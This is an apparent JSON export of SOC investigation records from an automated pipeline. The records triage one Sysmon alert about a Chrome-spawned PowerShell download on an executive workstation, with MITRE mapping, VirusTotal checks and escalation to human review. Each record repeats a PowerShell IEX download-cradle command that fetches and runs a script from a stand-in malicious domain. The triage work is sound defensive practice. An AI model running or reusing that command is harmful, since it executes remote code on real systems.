  {
    "id": 44,
    "created_at": "2026-06-07T18:59:12.335136+00:00",
    "tsoc_record_type": "soc_investigation_framework",
    "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
    "search_name": "Sysmon: PowerShell Download Activity (t8372)",
    "payload": {
      "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
      "phase": "framework_mapping",
      "content": [
        {
          "id": "T1059.001",
          "name": "Command and Scripting Interpreter: PowerShell",
          "framework": "MITRE ATT&CK",
          "rationale": "System Context field 'signature_id' is \"T1059.001\" and the CommandLine shows a PowerShell execution (\"powershell.exe -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\\\"\") indicating use of the PowerShell interpreter.",
          "confidence": "high"
        },
        {
          "id": "T1105",
          "name": "Ingress Tool Transfer",
          "framework": "MITRE ATT&CK",
          "rationale": "The CommandLine includes a DownloadString call to a remote URL (\"http://evil-payload-distro.net/invoice.js\"), which aligns with downloading a tool or payload onto the host.",
          "confidence": "low"
        },
        {
          "id": "KC-3",
          "name": "Delivery",
          "framework": "Cyber Kill Chain",
          "rationale": "The activity involves transferring a script from the remote domain (field 'url'/'domain') to the endpoint via PowerShell, matching the delivery phase of the kill chain.",
          "confidence": "low"
        }
      ],
      "raw_alert": {
        "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
        "row_index": 0,
        "normalized": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "result_row": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "search_name": "Sysmon: PowerShell Download Activity (t8372)",
        "splunk_results_row_count": 1
      },
      "row_index": 0,
      "stored_at": "2026-06-07T18:59:12.301566+00:00",
      "search_name": "Sysmon: PowerShell Download Activity (t8372)",
      "analysis_output": {
        "triage": {
          "report": {
            "factors": [
              {
                "title": "Judge verdict",
                "explanation": "Original verdict 'needs_investigation' mapped to NEEDS_HUMAN_REVIEW.",
                "score_impact": null
              },
              {
                "title": "Review class base",
                "explanation": "Base queue weight for NEEDS HUMAN REVIEW.",
                "score_impact": 55
              },
              {
                "title": "Judge priority",
                "explanation": "Judge marked priority 'high'.",
                "score_impact": 10
              },
              {
                "title": "Inventory risk",
                "explanation": "Elevated user/asset risk_score from inventory.",
                "score_impact": 9
              },
              {
                "title": "Human review default",
                "explanation": "Inconclusive or escalated verdict — analyst validation required.",
                "score_impact": 8
              }
            ],
            "headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82.",
            "why_verdict": "Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story.",
            "signal_notes": [],
            "why_priority": "Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue.",
            "recommended_action": "Human review required before disposition — do not auto-close. Judge recommended: Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity."
          },
          "signals": [],
          "mapped_from": {
            "judge.verdict": "needs_investigation",
            "judge.priority": "high",
            "judge.confidence": "medium",
            "review_verdict_raw": "NEEDS_HUMAN_REVIEW"
          },
          "source_track": "security",
          "triage_score": 82,
          "review_verdict": "NEEDS_HUMAN_REVIEW",
          "confidence_score": 0.65,
          "needs_human_review": true,
          "priority_rationale": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82. Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story. Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue. Judge rationale: Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero ad",
          "investigation_priority": "critical"
        },
        "summary": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
        "verdict": "needs_investigation",
        "priority": "high",
        "rationale": "Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero additional events but highlights correlation with similar alerts: a critical outbound C2 event and a high‑priority scheduled task on the same host, suggesting a possible multi‑stage intrusion. Therefore, the balance of evidence leans toward a suspicious scenario requiring immediate, concrete data collection via Splunk to confirm or refute malicious intent.",
        "confidence": "medium",
        "triage_score": 82,
        "review_verdict": "NEEDS_HUMAN_REVIEW",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "needs_human_review": true,
        "recommended_next_step": "Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity.",
        "investigation_priority": "critical",
        "triage_report_headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82."
      },
      "tsoc_record_type": "soc_investigation_framework"
    },
    "row_index": 0
  },
  {
    "id": 45,
    "created_at": "2026-06-07T18:59:12.338599+00:00",
    "tsoc_record_type": "soc_investigation_enrichment",
    "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
    "search_name": "Sysmon: PowerShell Download Activity (t8372)",
    "payload": {
      "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
      "phase": "enrichment",
      "content": {
        "notes": "Matched asset via alert.host → hostname; Matched user via alert.user → user_id",
        "confidence": "high",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "matched_relationship_ids": []
      },
      "raw_alert": {
        "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
        "row_index": 0,
        "normalized": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "result_row": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "search_name": "Sysmon: PowerShell Download Activity (t8372)",
        "splunk_results_row_count": 1
      },
      "row_index": 0,
      "stored_at": "2026-06-07T18:59:12.301566+00:00",
      "search_name": "Sysmon: PowerShell Download Activity (t8372)",
      "analysis_output": {
        "triage": {
          "report": {
            "factors": [
              {
                "title": "Judge verdict",
                "explanation": "Original verdict 'needs_investigation' mapped to NEEDS_HUMAN_REVIEW.",
                "score_impact": null
              },
              {
                "title": "Review class base",
                "explanation": "Base queue weight for NEEDS HUMAN REVIEW.",
                "score_impact": 55
              },
              {
                "title": "Judge priority",
                "explanation": "Judge marked priority 'high'.",
                "score_impact": 10
              },
              {
                "title": "Inventory risk",
                "explanation": "Elevated user/asset risk_score from inventory.",
                "score_impact": 9
              },
              {
                "title": "Human review default",
                "explanation": "Inconclusive or escalated verdict — analyst validation required.",
                "score_impact": 8
              }
            ],
            "headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82.",
            "why_verdict": "Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story.",
            "signal_notes": [],
            "why_priority": "Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue.",
            "recommended_action": "Human review required before disposition — do not auto-close. Judge recommended: Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity."
          },
          "signals": [],
          "mapped_from": {
            "judge.verdict": "needs_investigation",
            "judge.priority": "high",
            "judge.confidence": "medium",
            "review_verdict_raw": "NEEDS_HUMAN_REVIEW"
          },
          "source_track": "security",
          "triage_score": 82,
          "review_verdict": "NEEDS_HUMAN_REVIEW",
          "confidence_score": 0.65,
          "needs_human_review": true,
          "priority_rationale": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82. Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story. Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue. Judge rationale: Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero ad",
          "investigation_priority": "critical"
        },
        "summary": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
        "verdict": "needs_investigation",
        "priority": "high",
        "rationale": "Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero additional events but highlights correlation with similar alerts: a critical outbound C2 event and a high‑priority scheduled task on the same host, suggesting a possible multi‑stage intrusion. Therefore, the balance of evidence leans toward a suspicious scenario requiring immediate, concrete data collection via Splunk to confirm or refute malicious intent.",
        "confidence": "medium",
        "triage_score": 82,
        "review_verdict": "NEEDS_HUMAN_REVIEW",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "needs_human_review": true,
        "recommended_next_step": "Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity.",
        "investigation_priority": "critical",
        "triage_report_headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82."
      },
      "tsoc_record_type": "soc_investigation_enrichment"
    },
    "row_index": 0
  },
  {
    "id": 46,
    "created_at": "2026-06-07T18:59:12.342332+00:00",
    "tsoc_record_type": "soc_investigation_risk",
    "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
    "search_name": "Sysmon: PowerShell Download Activity (t8372)",
    "payload": {
      "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
      "phase": "risk_context",
      "content": "Asset t8372-desktop-bruce: criticality=critical, risk_score=9. User WAYNECORPINC\\bwayne: risk_score=9, department=Executive.",
      "raw_alert": {
        "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
        "row_index": 0,
        "normalized": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "result_row": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "search_name": "Sysmon: PowerShell Download Activity (t8372)",
        "splunk_results_row_count": 1
      },
      "row_index": 0,
      "stored_at": "2026-06-07T18:59:12.301566+00:00",
      "search_name": "Sysmon: PowerShell Download Activity (t8372)",
      "analysis_output": {
        "triage": {
          "report": {
            "factors": [
              {
                "title": "Judge verdict",
                "explanation": "Original verdict 'needs_investigation' mapped to NEEDS_HUMAN_REVIEW.",
                "score_impact": null
              },
              {
                "title": "Review class base",
                "explanation": "Base queue weight for NEEDS HUMAN REVIEW.",
                "score_impact": 55
              },
              {
                "title": "Judge priority",
                "explanation": "Judge marked priority 'high'.",
                "score_impact": 10
              },
              {
                "title": "Inventory risk",
                "explanation": "Elevated user/asset risk_score from inventory.",
                "score_impact": 9
              },
              {
                "title": "Human review default",
                "explanation": "Inconclusive or escalated verdict — analyst validation required.",
                "score_impact": 8
              }
            ],
            "headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82.",
            "why_verdict": "Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story.",
            "signal_notes": [],
            "why_priority": "Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue.",
            "recommended_action": "Human review required before disposition — do not auto-close. Judge recommended: Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity."
          },
          "signals": [],
          "mapped_from": {
            "judge.verdict": "needs_investigation",
            "judge.priority": "high",
            "judge.confidence": "medium",
            "review_verdict_raw": "NEEDS_HUMAN_REVIEW"
          },
          "source_track": "security",
          "triage_score": 82,
          "review_verdict": "NEEDS_HUMAN_REVIEW",
          "confidence_score": 0.65,
          "needs_human_review": true,
          "priority_rationale": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82. Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story. Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue. Judge rationale: Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero ad",
          "investigation_priority": "critical"
        },
        "summary": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
        "verdict": "needs_investigation",
        "priority": "high",
        "rationale": "Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero additional events but highlights correlation with similar alerts: a critical outbound C2 event and a high‑priority scheduled task on the same host, suggesting a possible multi‑stage intrusion. Therefore, the balance of evidence leans toward a suspicious scenario requiring immediate, concrete data collection via Splunk to confirm or refute malicious intent.",
        "confidence": "medium",
        "triage_score": 82,
        "review_verdict": "NEEDS_HUMAN_REVIEW",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "needs_human_review": true,
        "recommended_next_step": "Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity.",
        "investigation_priority": "critical",
        "triage_report_headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82."
      },
      "tsoc_record_type": "soc_investigation_risk"
    },
    "row_index": 0
  },
  {
    "id": 47,
    "created_at": "2026-06-07T18:59:12.345774+00:00",
    "tsoc_record_type": "soc_investigation_threat_intel",
    "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
    "search_name": "Sysmon: PowerShell Download Activity (t8372)",
    "payload": {
      "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
      "phase": "threat_intel",
      "content": {
        "iocs": [
          {
            "ioc": "evil-payload-distro.net",
            "link": "https://www.virustotal.com/api/v3/domains/evil-payload-distro.net",
            "vt_id": "evil-payload-distro.net",
            "verdict": "undetected",
            "vt_type": "domain",
            "ioc_type": "domain",
            "reputation": 0,
            "total_votes": {
              "harmless": 0,
              "malicious": 0
            },
            "last_analysis_date": 1780027383,
            "last_analysis_stats": {
              "timeout": 0,
              "harmless": 0,
              "malicious": 0,
              "suspicious": 0,
              "undetected": 91
            }
          },
          {
            "ioc": "http://evil-payload-distro.net/invoice.js",
            "error": "not_found",
            "verdict": "not_found",
            "ioc_type": "url"
          }
        ],
        "note": "Checked 2 IOC(s) via VirusTotal; no malicious or suspicious detections in last_analysis_stats.",
        "source": "virustotal",
        "status": "no_significant_hits",
        "findings": [],
        "checked_ioc_count": 2
      },
      "raw_alert": {
        "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
        "row_index": 0,
        "normalized": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "result_row": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "search_name": "Sysmon: PowerShell Download Activity (t8372)",
        "splunk_results_row_count": 1
      },
      "row_index": 0,
      "stored_at": "2026-06-07T18:59:12.301566+00:00",
      "search_name": "Sysmon: PowerShell Download Activity (t8372)",
      "analysis_output": {
        "triage": {
          "report": {
            "factors": [
              {
                "title": "Judge verdict",
                "explanation": "Original verdict 'needs_investigation' mapped to NEEDS_HUMAN_REVIEW.",
                "score_impact": null
              },
              {
                "title": "Review class base",
                "explanation": "Base queue weight for NEEDS HUMAN REVIEW.",
                "score_impact": 55
              },
              {
                "title": "Judge priority",
                "explanation": "Judge marked priority 'high'.",
                "score_impact": 10
              },
              {
                "title": "Inventory risk",
                "explanation": "Elevated user/asset risk_score from inventory.",
                "score_impact": 9
              },
              {
                "title": "Human review default",
                "explanation": "Inconclusive or escalated verdict — analyst validation required.",
                "score_impact": 8
              }
            ],
            "headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82.",
            "why_verdict": "Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story.",
            "signal_notes": [],
            "why_priority": "Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue.",
            "recommended_action": "Human review required before disposition — do not auto-close. Judge recommended: Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity."
          },
          "signals": [],
          "mapped_from": {
            "judge.verdict": "needs_investigation",
            "judge.priority": "high",
            "judge.confidence": "medium",
            "review_verdict_raw": "NEEDS_HUMAN_REVIEW"
          },
          "source_track": "security",
          "triage_score": 82,
          "review_verdict": "NEEDS_HUMAN_REVIEW",
          "confidence_score": 0.65,
          "needs_human_review": true,
          "priority_rationale": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82. Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story. Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue. Judge rationale: Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero ad",
          "investigation_priority": "critical"
        },
        "summary": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
        "verdict": "needs_investigation",
        "priority": "high",
        "rationale": "Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero additional events but highlights correlation with similar alerts: a critical outbound C2 event and a high‑priority scheduled task on the same host, suggesting a possible multi‑stage intrusion. Therefore, the balance of evidence leans toward a suspicious scenario requiring immediate, concrete data collection via Splunk to confirm or refute malicious intent.",
        "confidence": "medium",
        "triage_score": 82,
        "review_verdict": "NEEDS_HUMAN_REVIEW",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "needs_human_review": true,
        "recommended_next_step": "Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity.",
        "investigation_priority": "critical",
        "triage_report_headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82."
      },
      "tsoc_record_type": "soc_investigation_threat_intel"
    },
    "row_index": 0
  },
  {
    "id": 48,
    "created_at": "2026-06-07T18:59:12.349311+00:00",
    "tsoc_record_type": "soc_investigation_summary",
    "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
    "search_name": "Sysmon: PowerShell Download Activity (t8372)",
    "payload": {
      "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
      "phase": "summary",
      "content": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
      "raw_alert": {
        "sid": "scheduler__admin__search__t8372_ps_download_at_1727841660.1",
        "row_index": 0,
        "normalized": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "result_row": {
          "url": "http://evil-payload-distro.net/invoice.js",
          "User": "WAYNECORPINC\\bwayne",
          "host": "DESKTOP-BRUCE",
          "user": "WAYNECORPINC\\bwayne",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "_time": "2024-10-02T04:01:00Z",
          "index": "wineventlog",
          "domain": "evil-payload-distro.net",
          "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-BRUCE",
          "severity": "medium",
          "EventCode": "1",
          "signature": "PowerShell download cradle after browser activity",
          "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
          "CommandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-payload-distro.net/invoice.js')\"",
          "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          "signature_id": "T1059.001"
        },
        "search_name": "Sysmon: PowerShell Download Activity (t8372)",
        "splunk_results_row_count": 1
      },
      "row_index": 0,
      "stored_at": "2026-06-07T18:59:12.301566+00:00",
      "search_name": "Sysmon: PowerShell Download Activity (t8372)",
      "analysis_output": {
        "triage": {
          "report": {
            "factors": [
              {
                "title": "Judge verdict",
                "explanation": "Original verdict 'needs_investigation' mapped to NEEDS_HUMAN_REVIEW.",
                "score_impact": null
              },
              {
                "title": "Review class base",
                "explanation": "Base queue weight for NEEDS HUMAN REVIEW.",
                "score_impact": 55
              },
              {
                "title": "Judge priority",
